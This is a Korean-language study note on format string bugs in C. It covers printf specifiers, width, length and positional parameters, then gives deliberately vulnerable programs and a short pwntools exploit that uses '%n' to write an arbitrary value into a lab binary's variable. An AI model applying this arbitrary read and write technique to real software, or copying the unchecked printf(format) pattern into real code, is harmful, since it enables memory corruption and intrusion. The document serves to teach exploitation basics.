# 🧠 Format String Bug

## 📌 Definition
`%[parameter][flags][width][.precision][length][specifier]`

---

## 📄 Format String
### 1. Specifier
| 형식 지정자 | 설명 |
|---|---|
| d | 부호 있는 10진수 정수 |
| u | 부호 없는 10진수 정수 |
| s | 문자열 |
| x | 부호 없는 16진수 정수 |
| n | 해당하는 위치의 인자에 현재까지 사용된 문자열의 길이를 저장.<br>값을 출력하지 않음. |
| p | void형 포인터 |

```c
// Name: fs.c
// Compile: gcc -o fs fs.c

#include <stdio.h>

int main() {
  int num;

  printf("%d\n", 123);             // "123"
  printf("%s\n", "Hello, world");  // "Hello, world"
  printf("%x\n", 0xdeadbeef);      // "deadbeef"
  printf("%p\n", &num);            // "0x7ffe6d1cb2c4"
  
  return 0;
}
```

### 2. Width
최소 너비를 지정, 공백 문자(`' '`)를 문자열 앞에 패딩
정수인 경우 그 값만큼 최소 너비로 지정
`*` 첫 인자의 값만큼 최소 너비로 지정, 두 번쨰 인자를 출력
```c
// Name: fs_width.c
// Compile: gcc -o fs_width fs_width.c

#include <stdio.h>

int main() {
  int num;

  printf("%8d\n", 123);                 // "     123"
  printf("%s%n: hi\n", "Alice", &num);  // "Alice: hi", num = 5
  printf("%*s: hello\n", num, "Bob");   // "  Bob: hello "
  return 0;
}
```
### 3. Length
출력하고자 하는 변수의 크기를 지정 

| 길이 지정자 | 설명 |
|---|---|
| hh | 해당 인자가 char 크기임을 나타냅니다. |
| h | 해당 인자가 short int 크기임을 나타냅니다. |
| l | 해당 인자가 long int 크기임을 나타냅니다. |
| ll | 해당 인자가 long long int 크기임을 나타냅니다. |

```c
// Name: fs_length.c
// Compile: gcc -o fs_length fs_length.c

#include <stdio.h>

int main() {
  char a = 0x12;
  short b = 0x1234;
  long c = 0x12345678;
  long long d = 0x12345678abcdef01;

  printf("%hhd\n", a);    // "18"
  printf("%hd\n", b);     // "4660"
  printf("%ld\n", c);     // "305419896"
  printf("%lld\n", d);    // "1311768467750121217"
  return 0;
}
```
### 4.Parameter
참조할 인자의 인덱스를 지정
`%[파라미터 값]$d`형태로 표기
```c
// Name: fs_param.c
// Compile: gcc -o fs_param fs_param.c

#include <stdio.h>

int main() {
  int num;
  printf("%2$d, %1$d\n", 2, 1);  // "1, 2"
  return 0;
}
```

---

## 📄 FSB - READ
포맷 스트링을 사용자가 직접 입력할 수 있을 때
레지스터와 스택 읽기 + 임의 주소 읽기 및 쓰기 가능
```c
// Name: fsb_stack_read.c
// Compile: gcc -o fsb_stack_read fsb_stack_read.c

#include <stdio.h>

int main() {
  char format[0x100];
  
  printf("Format: ");
  scanf("%s", format);
  printf(format);
  
  return 0;
}
```
예를 들어 `%p/%p/%p/%p/%p/%p/%p/%p/`를 입력하면
```bash
$ ./fsb_stack_read
Format: %p/%p/%p/%p/%p/%p/%p/%p
0xa/(nil)/0x7f4dad0bbaa0/(nil)/0x55f04ffdc6b0/0x7025207025207025/0x2520702520702520/0x2070252070252070
```
`printf` 함수에 전달한 인자가 없는데도 x86-64의 함수 호출 규약에 따라
rdi 다음 인자인 `rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10]`이 출력된 것
`printf` 함수는 인자 개수를 확인하지 않음

스택에 어떤 메모리의 주소값이 있다면 해당 주소에 적혀 있는 파라미터 값을 읽을 수 있음 = 임의 주소 읽기

## 📄 FSB - Write
임의 주소 읽기에서와 마찬가지로 포맷 스트링에 임의 주소를 넣고, `%[n]$n`의 형식 지정자를 사용하면 쓰기 가능
```c
// Name: fsb_aaw.c
// Compile: gcc -o fsb_aaw fsb_aaw.c

#include <stdio.h>

int secret;

int main() {
  char format[0x100];

  printf("Address of `secret`: %p\n", &secret);
  printf("Format: ");
  scanf("%s", format);
  printf(format);
  
  printf("Secret: %d", secret);

  return 0;
}
```
`secret`값을 31337로 만드려면

```python
#!/usr/bin/python3
# Name: fsb_aaw.py

from pwn import *

p = process("./fsb_aaw")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%31337c%8$n".ljust(16, b'a')
fstring += p64(addr_secret)

p.sendline(fstring)
print(p.recvall())
```
로 공격 가능

---
